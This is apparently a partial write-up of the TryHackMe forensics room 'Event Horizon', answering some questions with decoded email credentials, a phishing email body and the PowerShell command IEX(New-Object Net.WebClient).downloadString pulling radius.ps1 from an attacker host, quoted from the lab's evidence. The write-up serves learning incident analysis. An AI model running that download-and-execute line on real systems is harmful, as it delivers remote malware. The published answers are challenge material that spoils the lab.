<h1 align="center">Event Horizon</h1>
<p align="center">2025, August 8<br> Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>, and I’m excited to join you on this adventure, part of my <code>459</code>-day-streak in <a href="https://tryhackme.com">TryHackMe</a>.<br>
<em>Unearth the secrets beyond the Event Horizon.</em>.<br>
<img width="80px" src="https://github.com/user-attachments/assets/317f46fa-cd76-40e1-8eac-dd8a7ba2de1d"><br>
Access this hard-level CTF clicking <a href="https://tryhackme.com/room/eventhorizonroom">here </a>.<br>
<img width="1200px" src="https://github.com/user-attachments/assets/62b55b16-1bf1-45ec-b74c-660cb302af9c"></p>

<br>


<br>
<h2>Task 1 . The Event Horizon</h2>
<p>Join Tom and Dom on a quest to find out what happens when you look beyond the Event Horizon. A quest beyond borders, they need you to utilize all your abilities to find the secrets that were taken when they crossed over to the other side.<br>

<strong>Note</strong>: For free users using the AttackBox, the challenge is best done using your own environment. Some browsers may detect the file as malicious. The zip file is safe to download with md5 of a1eda8f91365c322ebc8ce9b178248bc. In general, as a security practice, download the zip and analyze the forensic files on a dedicated virtual machine, and not on your host OS.</p>

<p><em>Answer the questions below</em></p>

<p>1.1. The attacker was able to find the correct pair of credentials for the email service. What were they? Format: email:password<br>
<code>tom.dom@eventhorizon.thm:password</code></p>

<p>

- VXNlcm5hbWU6 = <code>Username:</code><br>
- dG9tLmRvbUBldmVudGhvcml6b24udGht = <code>tom.dom@eventhorizon.thm</code><br>
- UGFzc3dvcmQ6 = <code>Password:</code><br>
- cGFzc3dvcmQ= = <code>password</code><br><br>
- <code>tom.dom@eventhorizon.thm</code> : <code>password</code></p>

<br>

<img width="1724" height="68" alt="image" src="https://github.com/user-attachments/assets/7081a1e8-f295-41d1-a916-1a9ad443e816" />

<br>
<br>

<p>1.2. What was the body of the email that was sent by the attacker?<br>
<code>Tom! I have done it! I have found the mass of the black hole we found! Run this script as the AdministratOr! Your BEst friend DOm</code></p>

<br>

<img width="1359" height="475" alt="image" src="https://github.com/user-attachments/assets/2eeffd47-5e0d-4aa1-a5ac-a6dd33940aed" />

<br>
<br>

<p>1.3. What command initiated the malicious script download?<br>
<code>IEX(New-Object Net.WebClient).downloadString('http://10.0.2.45/radius.ps1')</code>

<br>

<img width="1343" height="590" alt="image" src="https://github.com/user-attachments/assets/7316026d-9aed-4619-a090-156c1bdf96ce" />

<br>

<img width="1358" height="571" alt="image" src="https://github.com/user-attachments/assets/5657b241-81bf-4605-93e5-dbf7d15c7c4d" />

<br>
<br>

<p>1.4. What is the initial AES key that is used for decrypting the C2 traffic?<br>
<code>_________</code></p>

<br>
<br>


<p>1.5. What is the Administrator NTLM hash that the attacker found?<br>
<code>__________</code></p>

<br>
<br>

<p>1.6. What is the flag?<br>
<code>_________</code></p>


<br>
<br>
